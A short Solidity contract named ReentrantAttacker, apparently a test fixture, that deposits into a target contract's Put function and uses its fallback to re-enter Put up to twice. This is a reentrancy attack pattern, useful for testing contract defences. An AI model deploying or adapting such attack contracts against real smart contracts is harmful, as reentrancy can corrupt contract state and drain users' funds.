contract ReentrantAttacker {
    C public target;
    address[] public knownParticipants;
    uint256 public constant RECURSIONS = 2;
    uint256 public counter;
    uint256 public unlockTime;

    constructor(C _target) {
        target = _target;
    }

    function attack(uint256 _unlockTime) external payable {
        counter = 0;
        unlockTime = _unlockTime;
        knownParticipants.push(address(this));
        target.Put{value: msg.value}(_unlockTime);
    }

    function knownParticipantsLength() external view returns (uint256) {
        return knownParticipants.length;
    }

    fallback() external payable {
        if (counter < RECURSIONS) {
            counter++;
            target.Put{value: 0}(unlockTime);
        }
    }
}

